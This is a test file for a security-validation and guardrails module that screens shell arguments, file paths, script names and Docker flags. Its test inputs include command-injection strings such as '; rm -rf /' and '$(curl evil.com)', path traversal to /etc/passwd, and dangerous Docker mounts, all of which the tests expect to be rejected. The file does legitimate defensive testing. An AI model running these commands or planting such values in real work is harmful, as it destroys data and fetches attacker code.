/**
 * Tests for security validation and guardrails
 */

import { describe, it, expect } from 'bun:test'
import {
  validateArgument,
  validateArgumentArray,
  validateFilePath,
  validateDockerArgs,
  validateScriptName,
  validateContainerName,
  validateImageName,
  isDestructiveOperation
} from '../src/security-validation.js'
import {
  checkOperationGuardrails,
  checkScriptGuardrails,
  checkDockerVolumeMounts,
  checkDockerNetworkSettings,
  DEFAULT_SECURITY_CONFIG
} from '../src/security-guardrails.js'

describe('Security Validation', () => {
  describe('validateArgument', () => {
    it('should accept safe arguments', () => {
      const result = validateArgument('--verbose')
      expect(result.valid).toBe(true)
      expect(result.sanitized).toBe('--verbose')
    })

    it('should reject arguments with dangerous shell characters', () => {
      const result = validateArgument('arg; rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Dangerous character')
    })

    it('should reject command injection patterns', () => {
      const result = validateArgument('$(curl evil.com)')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Dangerous character')
    })

    it('should reject arguments that are too long', () => {
      const longArg = 'a'.repeat(2000)
      const result = validateArgument(longArg)
      expect(result.valid).toBe(false)
      expect(result.error).toContain('too long')
    })

    it('should reject empty or non-string arguments', () => {
      const result = validateArgument('')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('non-empty string')
    })
  })

  describe('validateArgumentArray', () => {
    it('should validate arrays of safe arguments', () => {
      const result = validateArgumentArray(['--verbose', '--output=file.txt'])
      expect(result.valid).toBe(true)
      expect(result.sanitized).toEqual(['--verbose', '--output=file.txt'])
    })

    it('should reject arrays with dangerous arguments', () => {
      const result = validateArgumentArray(['--verbose', '; rm -rf /'])
      expect(result.valid).toBe(false)
    })

    it('should reject arrays with too many arguments', () => {
      const manyArgs = Array(100).fill('--arg')
      const result = validateArgumentArray(manyArgs)
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Too many arguments')
    })
  })

  describe('validateFilePath', () => {
    it('should accept safe file paths', () => {
      const result = validateFilePath('./src/file.js')
      expect(result.valid).toBe(true)
    })

    it('should reject directory traversal attempts', () => {
      const result = validateFilePath('../../../etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Directory traversal')
    })

    it('should reject dangerous system paths', () => {
      const result = validateFilePath('/etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('not allowed')
    })

    it('should reject paths with null bytes', () => {
      const result = validateFilePath('file\0.txt')
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Null bytes')
    })
  })

  describe('validateDockerArgs', () => {
    it('should accept safe Docker arguments', () => {
      const result = validateDockerArgs(['--rm', '--name=test'])
      expect(result.valid).toBe(true)
    })

    it('should reject dangerous Docker flags', () => {
      const result = validateDockerArgs(['--privileged'])
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Dangerous Docker argument')
    })

    it('should reject dangerous volume mounts', () => {
      const result = validateDockerArgs(['-v=/etc:/etc'])
      expect(result.valid).toBe(false)
      expect(result.error).toContain('Invalid volume mount')
    })
  })

  describe('validateScriptName', () => {
    it('should accept valid script names', () => {
      const result = validateScriptName('build')
      expect(result.valid).toBe(true)
    })

    it('should accept namespaced script names', () => {
      const result = validateScriptName('test:unit')
      expect(result.valid).toBe(true)
    })

    it('should reject script names with dangerous characters', () => {
      const result = validateScriptName('build; rm -rf /')
      expect(result.valid).toBe(false)
    })

    it('should reject overly long script names', () => {
      const longName = 'a'.repeat(200)
      const result = validateScriptName(longName)
      expect(result.valid).toBe(false)
    })
  })

  describe('validateContainerName', () => {
    it('should accept valid container names', () => {
      const result = validateContainerName('my-app')
      expect(result.valid).toBe(true)
    })

    it('should reject invalid container names', () => {
      const result = validateContainerName('my app')
      expect(result.valid).toBe(false)
    })
  })

  describe('validateImageName', () => {
    it('should accept valid image names', () => {
      const result = validateImageName('nginx:latest')
      expect(result.valid).toBe(true)
    })

    it('should reject invalid image names', () => {
      const result = validateImageName('Nginx:Latest')
      expect(result.valid).toBe(false)
    })
  })

  describe('isDestructiveOperation', () => {
    it('should identify destructive actions', () => {
      expect(isDestructiveOperation('rm')).toBe(true)
      expect(isDestructiveOperation('down')).toBe(true)
      expect(isDestructiveOperation('stop')).toBe(true)
    })

    it('should identify safe actions', () => {
      expect(isDestructiveOperation('ps')).toBe(false)
      expect(isDestructiveOperation('logs')).toBe(false)
    })

    it('should identify force flags as destructive', () => {
      expect(isDestructiveOperation('up', ['--force'])).toBe(true)
      expect(isDestructiveOperation('build', ['--rm'])).toBe(true)
    })
  })
})

describe('Security Guardrails', () => {
  describe('checkOperationGuardrails', () => {
    it('should allow safe operations', () => {
      const result = checkOperationGuardrails('ps')
      expect(result.allowed).toBe(true)
      expect(result.requiresConfirmation).toBeUndefined()
    })

    it('should require confirmation for destructive operations', () => {
      const result = checkOperationGuardrails('rm')
      expect(result.allowed).toBe(true)
      expect(result.requiresConfirmation).toBe(true)
    })

    it('should block operations in read-only mode', () => {
      const config = { ...DEFAULT_SECURITY_CONFIG, readOnlyMode: true }
      const result = checkOperationGuardrails('rm', [], config)
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('read-only mode')
    })

    it('should block dangerous operations when configured', () => {
      const config = { ...DEFAULT_SECURITY_CONFIG, blockDangerous: true }
      const result = checkOperationGuardrails('rm', [], config)
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('blocked by security policy')
    })
  })

  describe('checkScriptGuardrails', () => {
    it('should allow safe scripts', () => {
      const result = checkScriptGuardrails('build')
      expect(result.allowed).toBe(true)
    })

    it('should require confirmation for dangerous scripts', () => {
      const result = checkScriptGuardrails('postinstall')
      expect(result.allowed).toBe(true)
      expect(result.requiresConfirmation).toBe(true)
    })

    it('should block dangerous scripts when configured', () => {
      const config = { ...DEFAULT_SECURITY_CONFIG, blockDangerous: true }
      const result = checkScriptGuardrails('postinstall', config)
      expect(result.allowed).toBe(false)
    })
  })

  describe('checkDockerVolumeMounts', () => {
    it('should allow safe volume mounts', () => {
      const result = checkDockerVolumeMounts(['-v', './app:/app'])
      expect(result.allowed).toBe(true)
    })

    it('should block dangerous volume mounts', () => {
      const result = checkDockerVolumeMounts(['-v=/var/run/docker.sock:/var/run/docker.sock'])
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('not allowed')
    })

    it('should require confirmation for system directory mounts', () => {
      const result = checkDockerVolumeMounts(['-v=./app:/etc'])
      expect(result.allowed).toBe(true)
      expect(result.requiresConfirmation).toBe(true)
    })
  })

  describe('checkDockerNetworkSettings', () => {
    it('should allow safe network settings', () => {
      const result = checkDockerNetworkSettings(['--network=bridge'])
      expect(result.allowed).toBe(true)
    })

    it('should block host networking', () => {
      const result = checkDockerNetworkSettings(['--network=host'])
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Host networking')
    })

    it('should block privileged containers', () => {
      const result = checkDockerNetworkSettings(['--privileged'])
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Privileged containers')
    })

    it('should require confirmation for capability additions', () => {
      const result = checkDockerNetworkSettings(['--cap-add=SYS_ADMIN'])
      expect(result.allowed).toBe(true)
      expect(result.requiresConfirmation).toBe(true)
    })
  })
})